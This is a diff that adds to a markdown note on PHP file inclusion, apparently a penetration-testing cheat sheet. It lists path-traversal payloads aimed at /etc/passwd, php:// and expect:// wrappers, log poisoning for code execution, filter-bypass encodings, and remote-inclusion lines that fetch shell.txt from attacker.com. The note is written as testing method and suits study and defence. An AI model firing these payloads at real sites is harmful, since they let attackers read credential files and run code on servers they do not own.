@@ -22,4 +22,44 @@ It is can be by securing the path or blocking certains types of character such a
 
 ## Remote File Inclusion (RFI)
 
-Instead of pointing the `include()`function at a local
+Instead of pointing the `include()`function at a local file, the attacker points it at a file posted on a server he controls.
+requirements: a PHP configuration that allows url and fopen enabled (enabled by default) so that include() can accept urls.
+
+## Methodology to test file inclusions
+
+### 1. Find Candidates
+Params like `page`, `file`, `template`, `path`, `lang`, `view`.
+
+### 2. LFI Payloads
+../../../../etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+../../../etc/passwd%00
+
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=config.php
+data://text/plain;base64,<payload>
+expect://id
+
+### 3. Targets
+- Linux: /etc/passwd, /proc/self/environ, /var/log/apache2/access.log
+- Windows: C:\Windows\win.ini
+
+### 4. Log Poisoning (RCE)
+Inject PHP via User-Agent/Referer header → include log file to execute.
+
+### 5. RFI Payloads (needs allow_url_include)
+http://attacker.com/shell.txt
+//attacker.com/shell.txt
+
+### 6. Filter Bypasses
+- `../` stripped → `....//`, `%252e%252e%252f`
+- Required prefix → `images/../../etc/passwd`
+- Required suffix → null byte, wrapper tricks
+- WAF keyword → case/encoding variation
+
+### 7. Tools
+Burp Intruder + SecLists (Fuzzing/LFI), ffuf, wfuzz, fimap, Kadimus
+
+### 8. Confirm
+Successful read of known sensitive file = confirmed LFI
